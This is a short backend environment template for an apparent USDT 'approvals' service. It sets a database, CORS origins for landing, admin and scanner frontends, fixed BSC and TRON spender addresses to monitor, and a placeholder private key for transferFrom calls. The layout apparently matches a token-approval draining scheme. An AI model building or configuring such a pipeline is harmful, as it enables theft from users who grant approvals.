# ============================================
# BACKEND - Environment Variables
# ============================================

# Server
PORT=3000

# MongoDB Connection String
# Local: mongodb://localhost:27017/usdt-approvals
# Render: Use the Internal Database URL from your Render MongoDB instance
MONGO_DB=mongodb://localhost:27017/usdt-approvals

# CORS - Comma-separated frontend URLs
# Local: http://localhost:5173,http://localhost:5174,http://localhost:3001
# Production: https://your-landing.vercel.app,https://your-admin.vercel.app,https://your-scanner.vercel.app
CORS_ORIGIN=http://localhost:5173,http://localhost:5174,http://localhost:3001

# BSC Spender Address
MONITOR_APPROVAL_FOR=0x739163eCbE2AA2C70a9a5595205466469cC78d8B

# TRON Spender Address
MONITOR_APPROVAL_FOR_TRON=TU43rNiQnHg6iKV4bcLykSzRUdW86kAtRA

# TRON Wallet Private Key (for transferFrom calls)
TRON_WALLET_PRIVATE_KEY=your_tron_private_key_here
